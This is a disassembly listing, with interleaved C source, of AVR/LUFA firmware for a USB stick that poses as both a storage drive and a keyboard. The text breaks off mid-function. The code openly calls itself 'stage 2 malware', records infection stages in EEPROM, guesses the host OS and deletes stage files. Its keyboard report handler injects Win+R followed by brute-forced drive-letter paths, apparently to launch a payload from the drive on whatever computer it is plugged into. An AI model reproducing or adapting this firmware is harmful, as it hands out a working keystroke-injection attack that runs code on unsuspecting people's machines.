    391e:	41 f0       	breq	.+16     	; 0x3930 <SetupHardware+0x114>
        {
            eppr_vars.curr_stage = STAG_2;
    3920:	81 e0       	ldi	r24, 0x01	; 1
    3922:	80 93 83 09 	sts	0x0983, r24	; 0x800983 <eppr_vars+0x1>
            printf("\r\n\r\nI AM IN STAGE 2 MALWARE IN USB!\r\n");
    3926:	8e eb       	ldi	r24, 0xBE	; 190
    3928:	94 e0       	ldi	r25, 0x04	; 4
    392a:	0e 94 84 39 	call	0x7308	; 0x7308 <puts>
    392e:	04 c0       	rjmp	.+8      	; 0x3938 <SetupHardware+0x11c>
        }
        else
        {
            printf("\r\ni am not in stage 2\r\n");
    3930:	83 ee       	ldi	r24, 0xE3	; 227
    3932:	94 e0       	ldi	r25, 0x04	; 4
    3934:	0e 94 84 39 	call	0x7308	; 0x7308 <puts>
        }
    }

    print_eepr();
    3938:	0e 94 46 03 	call	0x68c	; 0x68c <print_eepr>

    for (int i = 0; i < 3; i++)
    393c:	80 e0       	ldi	r24, 0x00	; 0
    393e:	90 e0       	ldi	r25, 0x00	; 0
    3940:	0a c0       	rjmp	.+20     	; 0x3956 <SetupHardware+0x13a>
    3942:	ff ef       	ldi	r31, 0xFF	; 255
    3944:	23 ed       	ldi	r18, 0xD3	; 211
    3946:	30 e3       	ldi	r19, 0x30	; 48
    3948:	f1 50       	subi	r31, 0x01	; 1
    394a:	20 40       	sbci	r18, 0x00	; 0
    394c:	30 40       	sbci	r19, 0x00	; 0
    394e:	e1 f7       	brne	.-8      	; 0x3948 <SetupHardware+0x12c>
    3950:	00 c0       	rjmp	.+0      	; 0x3952 <SetupHardware+0x136>
    3952:	00 00       	nop
    3954:	01 96       	adiw	r24, 0x01	; 1
    3956:	83 30       	cpi	r24, 0x03	; 3
    3958:	91 05       	cpc	r25, r1
    395a:	9c f3       	brlt	.-26     	; 0x3942 <SetupHardware+0x126>
    {
        _delay_ms(1000);
    }

    on_sd();
    395c:	0e 94 bd 01 	call	0x37a	; 0x37a <on_sd>

    sdcard_Init();
    3960:	0e 94 dc 29 	call	0x53b8	; 0x53b8 <sdcard_Init>

		/* Inline Functions: */
		#if !defined(__DOXYGEN__)
			static inline void LEDs_Init(void)
			{
				DDRD  |=  LEDS_ALL_LEDS;
    3964:	8a b1       	in	r24, 0x0a	; 10
    3966:	80 6c       	ori	r24, 0xC0	; 192
    3968:	8a b9       	out	0x0a, r24	; 10
				PORTD &= ~LEDS_ALL_LEDS;
    396a:	8b b1       	in	r24, 0x0b	; 11
    396c:	8f 73       	andi	r24, 0x3F	; 63
    396e:	8b b9       	out	0x0b, r24	; 11

		/* Inline Functions: */
		#if !defined(__DOXYGEN__)
			static inline void Buttons_Init(void)
			{
				DDRD  &= ~BUTTONS_BUTTON1;
    3970:	8a b1       	in	r24, 0x0a	; 10
    3972:	8f 7d       	andi	r24, 0xDF	; 223
    3974:	8a b9       	out	0x0a, r24	; 10
				PORTD |=  BUTTONS_BUTTON1;
    3976:	8b b1       	in	r24, 0x0b	; 11
    3978:	80 62       	ori	r24, 0x20	; 32
    397a:	8b b9       	out	0x0b, r24	; 11
                
                DDRE  &= ~BUTTONS_BUTTON2;
    397c:	8d b1       	in	r24, 0x0d	; 13
    397e:	8b 7f       	andi	r24, 0xFB	; 251
    3980:	8d b9       	out	0x0d, r24	; 13
                PORTE |=  BUTTONS_BUTTON2;
    3982:	8e b1       	in	r24, 0x0e	; 14
    3984:	84 60       	ori	r24, 0x04	; 4
    3986:	8e b9       	out	0x0e, r24	; 14

    LEDs_Init();

    Buttons_Init();

    USB_Init();
    3988:	0e 94 af 35 	call	0x6b5e	; 0x6b5e <USB_Init>
}
    398c:	c8 5b       	subi	r28, 0xB8	; 184
    398e:	df 4f       	sbci	r29, 0xFF	; 255
    3990:	0f b6       	in	r0, 0x3f	; 63
    3992:	f8 94       	cli
    3994:	de bf       	out	0x3e, r29	; 62
    3996:	0f be       	out	0x3f, r0	; 63
    3998:	cd bf       	out	0x3d, r28	; 61
    399a:	df 91       	pop	r29
    399c:	cf 91       	pop	r28
    399e:	1f 91       	pop	r17
    39a0:	08 95       	ret

000039a2 <main>:
/** Main program entry point. This routine contains the overall program flow, including initial
 *  setup of all components and the main program loop.
 */
int main(void)
{
    SetupHardware();
    39a2:	3c df       	rcall	.-392    	; 0x381c <SetupHardware>
				PORTD &= ~LEDMask;
			}

			static inline void LEDs_SetAllLEDs(const uint8_t LEDMask)
			{
				PORTD = ((PORTD & ~LEDS_ALL_LEDS) | LEDMask);
    39a4:	8b b1       	in	r24, 0x0b	; 11
    39a6:	8f 73       	andi	r24, 0x3F	; 63
    39a8:	80 64       	ori	r24, 0x40	; 64
    39aa:	8b b9       	out	0x0b, r24	; 11
			static inline void GlobalInterruptEnable(void)
			{
				GCC_MEMORY_BARRIER();

				#if (ARCH == ARCH_AVR8)
				sei();
    39ac:	78 94       	sei

    GlobalInterruptEnable();

    for (;;)
    {
        MS_Device_USBTask(&Disk_MS_Interface);
    39ae:	8e e1       	ldi	r24, 0x1E	; 30
    39b0:	91 e0       	ldi	r25, 0x01	; 1
    39b2:	0e 94 48 32 	call	0x6490	; 0x6490 <MS_Device_USBTask>
        HID_Device_USBTask(&Keyboard_HID_Interface);
    39b6:	8e e0       	ldi	r24, 0x0E	; 14
    39b8:	91 e0       	ldi	r25, 0x01	; 1
    39ba:	0e 94 7e 30 	call	0x60fc	; 0x60fc <HID_Device_USBTask>
        USB_USBTask();
    39be:	0e 94 b2 38 	call	0x7164	; 0x7164 <USB_USBTask>
        delete_stages_files();
    39c2:	0e 94 2a 27 	call	0x4e54	; 0x4e54 <delete_stages_files>
    39c6:	f3 cf       	rjmp	.-26     	; 0x39ae <main+0xc>

000039c8 <EVENT_USB_Device_Connect>:
}

/** Event handler for the library USB Connection event. */
void EVENT_USB_Device_Connect(void)
{
    printf_P(PSTR("Connect\r\n"));
    39c8:	81 ec       	ldi	r24, 0xC1	; 193
    39ca:	91 e0       	ldi	r25, 0x01	; 1
    39cc:	9f 93       	push	r25
    39ce:	8f 93       	push	r24
    39d0:	0e 94 5d 39 	call	0x72ba	; 0x72ba <printf_P>
    39d4:	8b b1       	in	r24, 0x0b	; 11
    39d6:	8f 73       	andi	r24, 0x3F	; 63
    39d8:	80 68       	ori	r24, 0x80	; 128
    39da:	8b b9       	out	0x0b, r24	; 11

    LEDs_SetAllLEDs(LEDMASK_USB_ENUMERATING);
}
    39dc:	0f 90       	pop	r0
    39de:	0f 90       	pop	r0
    39e0:	08 95       	ret

000039e2 <EVENT_USB_Device_Disconnect>:

/** Event handler for the library USB Disconnection event. */
void EVENT_USB_Device_Disconnect(void)
{
    printf_P(PSTR("Disconnect\r\n"));
    39e2:	84 eb       	ldi	r24, 0xB4	; 180
    39e4:	91 e0       	ldi	r25, 0x01	; 1
    39e6:	9f 93       	push	r25
    39e8:	8f 93       	push	r24
    39ea:	0e 94 5d 39 	call	0x72ba	; 0x72ba <printf_P>
    39ee:	8b b1       	in	r24, 0x0b	; 11
    39f0:	8f 73       	andi	r24, 0x3F	; 63
    39f2:	80 64       	ori	r24, 0x40	; 64
    39f4:	8b b9       	out	0x0b, r24	; 11
    LEDs_SetAllLEDs(LEDMASK_USB_NOTREADY);
}
    39f6:	0f 90       	pop	r0
    39f8:	0f 90       	pop	r0
    39fa:	08 95       	ret

000039fc <EVENT_USB_Device_ConfigurationChanged>:

/** Event handler for the library USB Configuration Changed event. */
void EVENT_USB_Device_ConfigurationChanged(void)
{
    39fc:	cf 93       	push	r28
    bool ConfigSuccess = true;

    printf_P(PSTR("Ready\r\n"));
    39fe:	8c ea       	ldi	r24, 0xAC	; 172
    3a00:	91 e0       	ldi	r25, 0x01	; 1
    3a02:	9f 93       	push	r25
    3a04:	8f 93       	push	r24
    3a06:	0e 94 5d 39 	call	0x72ba	; 0x72ba <printf_P>

    ConfigSuccess &= HID_Device_ConfigureEndpoints(&Keyboard_HID_Interface);
    3a0a:	8e e0       	ldi	r24, 0x0E	; 14
    3a0c:	91 e0       	ldi	r25, 0x01	; 1
    3a0e:	0e 94 6a 30 	call	0x60d4	; 0x60d4 <HID_Device_ConfigureEndpoints>
    3a12:	c8 2f       	mov	r28, r24
    ConfigSuccess &= MS_Device_ConfigureEndpoints(&Disk_MS_Interface);
    3a14:	8e e1       	ldi	r24, 0x1E	; 30
    3a16:	91 e0       	ldi	r25, 0x01	; 1
    3a18:	0e 94 2e 32 	call	0x645c	; 0x645c <MS_Device_ConfigureEndpoints>
						break;
					case USB_INT_EORSTI:
						UDIEN  |= (1 << EORSTE);
						break;
					case USB_INT_SOFI:
						UDIEN  |= (1 << SOFE);
    3a1c:	e2 ee       	ldi	r30, 0xE2	; 226
    3a1e:	f0 e0       	ldi	r31, 0x00	; 0
    3a20:	90 81       	ld	r25, Z
    3a22:	94 60       	ori	r25, 0x04	; 4
    3a24:	90 83       	st	Z, r25

    USB_Device_EnableSOFEvents();

    LEDs_SetAllLEDs(ConfigSuccess ? LEDMASK_USB_READY : LEDMASK_USB_ERROR);
    3a26:	0f 90       	pop	r0
    3a28:	0f 90       	pop	r0
    3a2a:	cc 23       	and	r28, r28
    3a2c:	21 f0       	breq	.+8      	; 0x3a36 <EVENT_USB_Device_ConfigurationChanged+0x3a>
    3a2e:	88 23       	and	r24, r24
    3a30:	11 f0       	breq	.+4      	; 0x3a36 <EVENT_USB_Device_ConfigurationChanged+0x3a>
    3a32:	90 ec       	ldi	r25, 0xC0	; 192
    3a34:	01 c0       	rjmp	.+2      	; 0x3a38 <EVENT_USB_Device_ConfigurationChanged+0x3c>
    3a36:	90 e4       	ldi	r25, 0x40	; 64
    3a38:	8b b1       	in	r24, 0x0b	; 11
    3a3a:	8f 73       	andi	r24, 0x3F	; 63
    3a3c:	89 2b       	or	r24, r25
    3a3e:	8b b9       	out	0x0b, r24	; 11
}
    3a40:	cf 91       	pop	r28
    3a42:	08 95       	ret

00003a44 <EVENT_USB_Device_ControlRequest>:

/** Event handler for the library USB Control Request reception event. */
void EVENT_USB_Device_ControlRequest(void)
{
    MS_Device_ProcessControlRequest(&Disk_MS_Interface);
    3a44:	8e e1       	ldi	r24, 0x1E	; 30
    3a46:	91 e0       	ldi	r25, 0x01	; 1
    3a48:	0e 94 f0 31 	call	0x63e0	; 0x63e0 <MS_Device_ProcessControlRequest>
    HID_Device_ProcessControlRequest(&Keyboard_HID_Interface);
    3a4c:	8e e0       	ldi	r24, 0x0E	; 14
    3a4e:	91 e0       	ldi	r25, 0x01	; 1
    3a50:	0c 94 13 2f 	jmp	0x5e26	; 0x5e26 <HID_Device_ProcessControlRequest>
    3a54:	08 95       	ret

00003a56 <CALLBACK_MS_Device_SCSICommandReceived>:
 *
 *  \param[in] MSInterfaceInfo  Pointer to the Mass Storage class interface configuration structure being referenced
 */
bool CALLBACK_MS_Device_SCSICommandReceived(USB_ClassInfo_MS_Device_t* const
        MSInterfaceInfo)
{
    3a56:	cf 93       	push	r28
    3a58:	df 93       	push	r29
    3a5a:	ec 01       	movw	r28, r24
    bool CommandSuccess;
    static bool show_os = false;

    if (!show_os)
    3a5c:	80 91 52 09 	lds	r24, 0x0952	; 0x800952 <show_os.5093>
    3a60:	81 11       	cpse	r24, r1
    3a62:	11 c0       	rjmp	.+34     	; 0x3a86 <CALLBACK_MS_Device_SCSICommandReceived+0x30>
    {
        show_os = true;
    3a64:	81 e0       	ldi	r24, 0x01	; 1
    3a66:	80 93 52 09 	sts	0x0952, r24	; 0x800952 <show_os.5093>
        printf("\r\nguess_host_os: %s\r\n", guess_host_os_string());
    3a6a:	0e 94 38 03 	call	0x670	; 0x670 <guess_host_os_string>
    3a6e:	9f 93       	push	r25
    3a70:	8f 93       	push	r24
    3a72:	8a ef       	ldi	r24, 0xFA	; 250
    3a74:	94 e0       	ldi	r25, 0x04	; 4
    3a76:	9f 93       	push	r25
    3a78:	8f 93       	push	r24
    3a7a:	0e 94 4a 39 	call	0x7294	; 0x7294 <printf>
    3a7e:	0f 90       	pop	r0
    3a80:	0f 90       	pop	r0
    3a82:	0f 90       	pop	r0
    3a84:	0f 90       	pop	r0
    3a86:	8b b1       	in	r24, 0x0b	; 11
    3a88:	8f 73       	andi	r24, 0x3F	; 63
    3a8a:	80 68       	ori	r24, 0x80	; 128
    3a8c:	8b b9       	out	0x0b, r24	; 11
    }

    LEDs_SetAllLEDs(LEDMASK_USB_BUSY);

    CommandSuccess = SCSI_DecodeSCSICommand(MSInterfaceInfo);
    3a8e:	ce 01       	movw	r24, r28
    3a90:	0e 94 d3 26 	call	0x4da6	; 0x4da6 <SCSI_DecodeSCSICommand>
    3a94:	9b b1       	in	r25, 0x0b	; 11
    3a96:	90 6c       	ori	r25, 0xC0	; 192
    3a98:	9b b9       	out	0x0b, r25	; 11

    LEDs_SetAllLEDs(LEDMASK_USB_READY);

    return CommandSuccess;
}
    3a9a:	df 91       	pop	r29
    3a9c:	cf 91       	pop	r28
    3a9e:	08 95       	ret

00003aa0 <EVENT_USB_Device_StartOfFrame>:
			 *  \param[in,out] HIDInterfaceInfo  Pointer to a structure containing a HID Class configuration and state.
			 */
			static inline void HID_Device_MillisecondElapsed(USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo) ATTR_ALWAYS_INLINE ATTR_NON_NULL_PTR_ARG(1);
			static inline void HID_Device_MillisecondElapsed(USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo)
			{
				if (HIDInterfaceInfo->State.IdleMSRemaining)
    3aa0:	80 91 1c 01 	lds	r24, 0x011C	; 0x80011c <Keyboard_HID_Interface+0xe>
    3aa4:	90 91 1d 01 	lds	r25, 0x011D	; 0x80011d <Keyboard_HID_Interface+0xf>
    3aa8:	00 97       	sbiw	r24, 0x00	; 0
    3aaa:	29 f0       	breq	.+10     	; 0x3ab6 <EVENT_USB_Device_StartOfFrame+0x16>
				  HIDInterfaceInfo->State.IdleMSRemaining--;
    3aac:	01 97       	sbiw	r24, 0x01	; 1
    3aae:	90 93 1d 01 	sts	0x011D, r25	; 0x80011d <Keyboard_HID_Interface+0xf>
    3ab2:	80 93 1c 01 	sts	0x011C, r24	; 0x80011c <Keyboard_HID_Interface+0xe>
    3ab6:	08 95       	ret

00003ab8 <CALLBACK_HID_Device_CreateHIDReport>:
        HIDInterfaceInfo,
        uint8_t* const ReportID,
        const uint8_t ReportType,
        void* ReportData,
        uint16_t* const ReportSize)
{
    3ab8:	cf 92       	push	r12
    3aba:	df 92       	push	r13
    3abc:	ef 92       	push	r14
    3abe:	ff 92       	push	r15
    3ac0:	0f 93       	push	r16
    3ac2:	1f 93       	push	r17
    3ac4:	cf 93       	push	r28
    3ac6:	df 93       	push	r29
    3ac8:	cd b7       	in	r28, 0x3d	; 61
    3aca:	de b7       	in	r29, 0x3e	; 62
    3acc:	c8 54       	subi	r28, 0x48	; 72
    3ace:	d1 09       	sbc	r29, r1
    3ad0:	0f b6       	in	r0, 0x3f	; 63
    3ad2:	f8 94       	cli
    3ad4:	de bf       	out	0x3e, r29	; 62
    3ad6:	0f be       	out	0x3f, r0	; 63
    3ad8:	cd bf       	out	0x3d, r28	; 61
    3ada:	79 01       	movw	r14, r18
			}

			static inline uint8_t Buttons_GetStatus(void) ATTR_WARN_UNUSED_RESULT;
			static inline uint8_t Buttons_GetStatus(void)
			{
				return (((PIND & BUTTONS_BUTTON1) ^ BUTTONS_BUTTON1) | ((PINE & BUTTONS_BUTTON2) ^ BUTTONS_BUTTON2));
    3adc:	89 b1       	in	r24, 0x09	; 9
    3ade:	9c b1       	in	r25, 0x0c	; 12
    static uint8_t curr_let = HID_KEYBOARD_SC_A;
    static uint8_t max_tries = 3;

    uint8_t ButtonStatus_LCL = Buttons_GetStatus();

    if (ButtonStatus_LCL & BUTTONS_BUTTON1)
    3ae0:	85 fd       	sbrc	r24, 5
    3ae2:	31 c0       	rjmp	.+98     	; 0x3b46 <CALLBACK_HID_Device_CreateHIDReport+0x8e>
    {
        print_eepr();
    3ae4:	0e 94 46 03 	call	0x68c	; 0x68c <print_eepr>
        printf_P(PSTR("\r\nresetting epprom values in the next reboot\r\n"));
    3ae8:	8d e7       	ldi	r24, 0x7D	; 125
    3aea:	91 e0       	ldi	r25, 0x01	; 1
    3aec:	9f 93       	push	r25
    3aee:	8f 93       	push	r24
    3af0:	0e 94 5d 39 	call	0x72ba	; 0x72ba <printf_P>
        ATOMIC_BLOCK(ATOMIC_RESTORESTATE )
    3af4:	df b6       	in	r13, 0x3f	; 63
    return 1;
}

static __inline__ uint8_t __iCliRetVal(void)
{
    cli();
    3af6:	f8 94       	cli
    3af8:	0f 90       	pop	r0
    3afa:	0f 90       	pop	r0
    3afc:	81 e0       	ldi	r24, 0x01	; 1
    3afe:	06 c0       	rjmp	.+12     	; 0x3b0c <CALLBACK_HID_Device_CreateHIDReport+0x54>
        {
            eppr_vars.restore_defaults_on_boot = 1;
    3b00:	81 e0       	ldi	r24, 0x01	; 1
    3b02:	80 93 82 09 	sts	0x0982, r24	; 0x800982 <eppr_vars>
            save_eepr();
    3b06:	0e 94 6d 03 	call	0x6da	; 0x6da <save_eepr>

    if (ButtonStatus_LCL & BUTTONS_BUTTON1)
    {
        print_eepr();
        printf_P(PSTR("\r\nresetting epprom values in the next reboot\r\n"));
        ATOMIC_BLOCK(ATOMIC_RESTORESTATE )
    3b0a:	80 e0       	ldi	r24, 0x00	; 0
    3b0c:	81 11       	cpse	r24, r1
    3b0e:	f8 cf       	rjmp	.-16     	; 0x3b00 <CALLBACK_HID_Device_CreateHIDReport+0x48>
    (void)__s;
}

static __inline__ void __iRestore(const  uint8_t *__s)
{
    SREG = *__s;
    3b10:	df be       	out	0x3f, r13	; 63
        {
            eppr_vars.restore_defaults_on_boot = 1;
            save_eepr();
        }
        CMD_t cmd = { .cmd = PRLE_CMD_FORMAT };
    3b12:	ce 01       	movw	r24, r28
    3b14:	01 96       	adiw	r24, 0x01	; 1
    3b16:	6c 01       	movw	r12, r24
    3b18:	88 e4       	ldi	r24, 0x48	; 72
    3b1a:	f6 01       	movw	r30, r12
    3b1c:	11 92       	st	Z+, r1
    3b1e:	8a 95       	dec	r24
    3b20:	e9 f7       	brne	.-6      	; 0x3b1c <CALLBACK_HID_Device_CreateHIDReport+0x64>
    3b22:	80 e1       	ldi	r24, 0x10	; 16
    3b24:	95 e0       	ldi	r25, 0x05	; 5
    3b26:	9a 83       	std	Y+2, r25	; 0x02
    3b28:	89 83       	std	Y+1, r24	; 0x01
        send_cmd(&cmd, NULL);
    3b2a:	60 e0       	ldi	r22, 0x00	; 0
    3b2c:	70 e0       	ldi	r23, 0x00	; 0
    3b2e:	c6 01       	movw	r24, r12
    3b30:	0e 94 e4 05 	call	0xbc8	; 0xbc8 <send_cmd>
        cmd.cmd = PRLE_CMD_REBOOTME;
    3b34:	85 e1       	ldi	r24, 0x15	; 21
    3b36:	95 e0       	ldi	r25, 0x05	; 5
    3b38:	9a 83       	std	Y+2, r25	; 0x02
    3b3a:	89 83       	std	Y+1, r24	; 0x01
        send_cmd(&cmd, NULL);
    3b3c:	60 e0       	ldi	r22, 0x00	; 0
    3b3e:	70 e0       	ldi	r23, 0x00	; 0
    3b40:	c6 01       	movw	r24, r12
    3b42:	0e 94 e4 05 	call	0xbc8	; 0xbc8 <send_cmd>
    }

    if (STAG_1 != eppr_vars.curr_stage || disable_keyboard_hack)
    3b46:	80 91 83 09 	lds	r24, 0x0983	; 0x800983 <eppr_vars+0x1>
    3b4a:	81 11       	cpse	r24, r1
    3b4c:	96 c0       	rjmp	.+300    	; 0x3c7a <CALLBACK_HID_Device_CreateHIDReport+0x1c2>
    3b4e:	80 91 5c 09 	lds	r24, 0x095C	; 0x80095c <disable_keyboard_hack>
    3b52:	81 11       	cpse	r24, r1
    3b54:	92 c0       	rjmp	.+292    	; 0x3c7a <CALLBACK_HID_Device_CreateHIDReport+0x1c2>
//#define NO_BRUTE_KEYBOARD
#ifdef NO_BRUTE_KEYBOARD
    goto bypass;
#endif

    if (reset_mod == 1)
    3b56:	80 91 51 09 	lds	r24, 0x0951	; 0x800951 <reset_mod.5107>
    3b5a:	81 30       	cpi	r24, 0x01	; 1
    3b5c:	29 f4       	brne	.+10     	; 0x3b68 <CALLBACK_HID_Device_CreateHIDReport+0xb0>
    {
        KeyboardReport->Modifier = 0;
    3b5e:	f7 01       	movw	r30, r14
    3b60:	10 82       	st	Z, r1
        reset_mod = 0;
    3b62:	10 92 51 09 	sts	0x0951, r1	; 0x800951 <reset_mod.5107>
    3b66:	89 c0       	rjmp	.+274    	; 0x3c7a <CALLBACK_HID_Device_CreateHIDReport+0x1c2>
    }
    else if (max_tries != 0)
    3b68:	90 91 0d 01 	lds	r25, 0x010D	; 0x80010d <max_tries.5109>
    3b6c:	99 23       	and	r25, r25
    3b6e:	09 f4       	brne	.+2      	; 0x3b72 <CALLBACK_HID_Device_CreateHIDReport+0xba>
    3b70:	84 c0       	rjmp	.+264    	; 0x3c7a <CALLBACK_HID_Device_CreateHIDReport+0x1c2>
    {
        if (cnt-- == 0)
    3b72:	20 91 0b 01 	lds	r18, 0x010B	; 0x80010b <cnt.5105>
    3b76:	30 91 0c 01 	lds	r19, 0x010C	; 0x80010c <cnt.5105+0x1>
    3b7a:	a9 01       	movw	r20, r18
    3b7c:	41 50       	subi	r20, 0x01	; 1
    3b7e:	51 09       	sbc	r21, r1
    3b80:	50 93 0c 01 	sts	0x010C, r21	; 0x80010c <cnt.5105+0x1>
    3b84:	40 93 0b 01 	sts	0x010B, r20	; 0x80010b <cnt.5105>
    3b88:	23 2b       	or	r18, r19
    3b8a:	09 f0       	breq	.+2      	; 0x3b8e <CALLBACK_HID_Device_CreateHIDReport+0xd6>
    3b8c:	76 c0       	rjmp	.+236    	; 0x3c7a <CALLBACK_HID_Device_CreateHIDReport+0x1c2>
        {
            switch (curr_snd)
    3b8e:	80 91 50 09 	lds	r24, 0x0950	; 0x800950 <curr_snd.5106>
    3b92:	85 30       	cpi	r24, 0x05	; 5
    3b94:	09 f4       	brne	.+2      	; 0x3b98 <CALLBACK_HID_Device_CreateHIDReport+0xe0>
    3b96:	49 c0       	rjmp	.+146    	; 0x3c2a <CALLBACK_HID_Device_CreateHIDReport+0x172>
    3b98:	68 f4       	brcc	.+26     	; 0x3bb4 <CALLBACK_HID_Device_CreateHIDReport+0xfc>
    3b9a:	82 30       	cpi	r24, 0x02	; 2
    3b9c:	49 f1       	breq	.+82     	; 0x3bf0 <CALLBACK_HID_Device_CreateHIDReport+0x138>
    3b9e:	28 f4       	brcc	.+10     	; 0x3baa <CALLBACK_HID_Device_CreateHIDReport+0xf2>
    3ba0:	88 23       	and	r24, r24
    3ba2:	c9 f0       	breq	.+50     	; 0x3bd6 <CALLBACK_HID_Device_CreateHIDReport+0x11e>
    3ba4:	81 30       	cpi	r24, 0x01	; 1
    3ba6:	01 f1       	breq	.+64     	; 0x3be8 <CALLBACK_HID_Device_CreateHIDReport+0x130>
    3ba8:	5d c0       	rjmp	.+186    	; 0x3c64 <CALLBACK_HID_Device_CreateHIDReport+0x1ac>
    3baa:	83 30       	cpi	r24, 0x03	; 3
    3bac:	89 f1       	breq	.+98     	; 0x3c10 <CALLBACK_HID_Device_CreateHIDReport+0x158>
    3bae:	84 30       	cpi	r24, 0x04	; 4
    3bb0:	c1 f1       	breq	.+112    	; 0x3c22 <CALLBACK_HID_Device_CreateHIDReport+0x16a>
    3bb2:	58 c0       	rjmp	.+176    	; 0x3c64 <CALLBACK_HID_Device_CreateHIDReport+0x1ac>
    3bb4:	88 30       	cpi	r24, 0x08	; 8
    3bb6:	09 f4       	brne	.+2      	; 0x3bba <CALLBACK_HID_Device_CreateHIDReport+0x102>
    3bb8:	44 c0       	rjmp	.+136    	; 0x3c42 <CALLBACK_HID_Device_CreateHIDReport+0x18a>
    3bba:	28 f4       	brcc	.+10     	; 0x3bc6 <CALLBACK_HID_Device_CreateHIDReport+0x10e>
    3bbc:	86 30       	cpi	r24, 0x06	; 6
    3bbe:	c9 f1       	breq	.+114    	; 0x3c32 <CALLBACK_HID_Device_CreateHIDReport+0x17a>
    3bc0:	87 30       	cpi	r24, 0x07	; 7
    3bc2:	d9 f1       	breq	.+118    	; 0x3c3a <CALLBACK_HID_Device_CreateHIDReport+0x182>
    3bc4:	4f c0       	rjmp	.+158    	; 0x3c64 <CALLBACK_HID_Device_CreateHIDReport+0x1ac>
    3bc6:	8a 30       	cpi	r24, 0x0A	; 10
    3bc8:	09 f4       	brne	.+2      	; 0x3bcc <CALLBACK_HID_Device_CreateHIDReport+0x114>
    3bca:	43 c0       	rjmp	.+134    	; 0x3c52 <CALLBACK_HID_Device_CreateHIDReport+0x19a>
    3bcc:	f0 f1       	brcs	.+124    	; 0x3c4a <CALLBACK_HID_Device_CreateHIDReport+0x192>
    3bce:	8b 30       	cpi	r24, 0x0B	; 11
    3bd0:	09 f4       	brne	.+2      	; 0x3bd4 <CALLBACK_HID_Device_CreateHIDReport+0x11c>
    3bd2:	43 c0       	rjmp	.+134    	; 0x3c5a <CALLBACK_HID_Device_CreateHIDReport+0x1a2>
    3bd4:	47 c0       	rjmp	.+142    	; 0x3c64 <CALLBACK_HID_Device_CreateHIDReport+0x1ac>
            {
                case 0:
                    KeyboardReport->Modifier = HID_KEYBOARD_MODIFIER_RIGHTGUI;
    3bd6:	80 e8       	ldi	r24, 0x80	; 128
    3bd8:	f7 01       	movw	r30, r14
    3bda:	80 83       	st	Z, r24
                    KeyboardReport->KeyCode[0] = HID_KEYBOARD_SC_R;
    3bdc:	85 e1       	ldi	r24, 0x15	; 21
    3bde:	82 83       	std	Z+2, r24	; 0x02
                    reset_mod = 1;
    3be0:	81 e0       	ldi	r24, 0x01	; 1
    3be2:	80 93 51 09 	sts	0x0951, r24	; 0x800951 <reset_mod.5107>
                    break;
    3be6:	3e c0       	rjmp	.+124    	; 0x3c64 <CALLBACK_HID_Device_CreateHIDReport+0x1ac>

                case 1:
                    KeyboardReport->KeyCode[0] = HID_KEYBOARD_SC_DELETE;
    3be8:	8c e4       	ldi	r24, 0x4C	; 76
    3bea:	f7 01       	movw	r30, r14
    3bec:	82 83       	std	Z+2, r24	; 0x02
                    break;
    3bee:	3a c0       	rjmp	.+116    	; 0x3c64 <CALLBACK_HID_Device_CreateHIDReport+0x1ac>

                case 2:
                    KeyboardReport->KeyCode[0] = curr_let;
    3bf0:	80 91 0a 01 	lds	r24, 0x010A	; 0x80010a <curr_let.5108>
    3bf4:	f7 01       	movw	r30, r14
    3bf6:	82 83       	std	Z+2, r24	; 0x02
                    curr_let++;
    3bf8:	8f 5f       	subi	r24, 0xFF	; 255
    3bfa:	80 93 0a 01 	sts	0x010A, r24	; 0x80010a <curr_let.5108>
                    if (curr_let == HID_KEYBOARD_SC_H)
    3bfe:	8b 30       	cpi	r24, 0x0B	; 11
    3c00:	89 f5       	brne	.+98     	; 0x3c64 <CALLBACK_HID_Device_CreateHIDReport+0x1ac>
                    {
                        curr_let = HID_KEYBOARD_SC_D;
    3c02:	87 e0       	ldi	r24, 0x07	; 7
    3c04:	80 93 0a 01 	sts	0x010A, r24	; 0x80010a <curr_let.5108>
                        max_tries--;
    3c08:	91 50       	subi	r25, 0x01	; 1
    3c0a:	90 93 0d 01 	sts	0x010D, r25	; 0x80010d <max_tries.5109>
    3c0e:	2a c0       	rjmp	.+84     	; 0x3c64 <CALLBACK_HID_Device_CreateHIDReport+0x1ac>
                    }
                    break;

                case 3:
                    KeyboardReport->Modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
    3c10:	82 e0       	ldi	r24, 0x02	; 2
    3c12:	f7 01       	movw	r30, r14
    3c14:	80 83       	st	Z, r24
                    KeyboardReport->KeyCode[0] = HID_KEYBOARD_SC_SEMICOLON_AND_COLON;
    3c16:	83 e3       	ldi	r24, 0x33	; 51
    3c18:	82 83       	std	Z+2, r24	; 0x02
                    reset_mod = 1;
    3c1a:	81 e0       	ldi	r24, 0x01	; 1
    3c1c:	80 93 51 09 	sts	0x0951, r24	; 0x800951 <reset_mod.5107>
                    break;
    3c20:	21 c0       	rjmp	.+66     	; 0x3c64 <CALLBACK_HID_Device_CreateHIDReport+0x1ac>

                case 4:
                    KeyboardReport->KeyCode[0] = HID_KEYBOARD_SC_BACKSLASH_AND_PIPE ;
    3c22:	81 e3       	ldi	r24, 0x31	; 49
    3c24:	f7 01       	movw	r30, r14
    3c26:	82 83       	std	Z+2, r24	; 0x02
                    break;
    3c28:	1d c0       	rjmp	.+58     	; 0x3c64 <CALLBACK_HID_Device_CreateHIDReport+0x1ac>

                case 5:
                    KeyboardReport->KeyCode[0] = HID_KEYBOARD_SC_D;
    3c2a:	87 e0       	ldi	r24, 0x07	; 7
    3c2c:	f7 01       	movw	r30, r14
    3c2e:	82 83       	std	Z+2, r24	; 0x02
                    break;
    3c30:	19 c0       	rjmp	.+50     	; 0x3c64 <CALLBACK_HID_Device_CreateHIDReport+0x1ac>

                case 6:
                    KeyboardReport->KeyCode[0] = HID_KEYBOARD_SC_DOT_AND_GREATER_THAN_SIGN;
    3c32:	87 e3       	ldi	r24, 0x37	; 55
    3c34:	f7 01       	movw	r30, r14
    3c36:	82 83       	std	Z+2, r24	; 0x02
                    break;
    3c38:	15 c0       	rjmp	.+42     	; 0x3c64 <CALLBACK_HID_Device_CreateHIDReport+0x1ac>

                case 7:
                    KeyboardReport->KeyCode[0] = HID_KEYBOARD_SC_E;
    3c3a:	88 e0       	ldi	r24, 0x08	; 8
    3c3c:	f7 01       	movw	r30, r14
    3c3e:	82 83       	std	Z+2, r24	; 0x02
                    break;
    3c40:	11 c0       	rjmp	.+34     	; 0x3c64 <CALLBACK_HID_Device_CreateHIDReport+0x1ac>

                case 8:
